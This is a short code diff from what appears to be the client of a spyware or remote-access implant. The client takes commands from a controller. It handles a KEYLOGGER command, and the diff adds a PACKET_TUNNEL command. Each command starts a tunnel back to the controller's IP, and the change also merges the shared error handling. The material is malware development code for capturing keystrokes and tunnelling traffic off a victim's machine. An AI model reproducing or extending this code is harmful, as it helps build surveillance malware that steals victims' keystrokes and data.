@@ -126,14 +126,19 @@ void Client::start() {
                         printf("[Client] Received KEYLOGGER command. Port: %d\n", command_arg+port_);
                         clspy_tunnel = new CLKeylogger();
                         rc = clspy_tunnel->init(ip_, port_ + command_arg, TCP_BASED);
-                        if (rc < 0) {
-                            delete clspy_tunnel;
-                            clspy_tunnel = nullptr;
-                            send_out(socket_, EXEC_ERROR);
-                            continue;
-                        }
-                        tunnel->clspy_tunnel_ = clspy_tunnel;
+                    } else if (command_code == PACKET_TUNNEL) {
+                        printf("[Client] Received PACKET_TUNNEL command");
+                        clspy_tunnel = new CLPacketTunnel();
+                        rc = clspy_tunnel->init(ip_, port_ + command_arg, TCP_BASED);
                     }
+
+                    if (rc < 0) {
+                        delete clspy_tunnel;
+                        clspy_tunnel = nullptr;
+                        send_out(socket_, EXEC_ERROR);
+                        continue;
+                    }
+                    tunnel->clspy_tunnel_ = clspy_tunnel;
 
                     rc = pthread_create(&tunnel->thread, NULL, cltunnel_helper, (void*)tunnel);
                     if (rc != 0) {
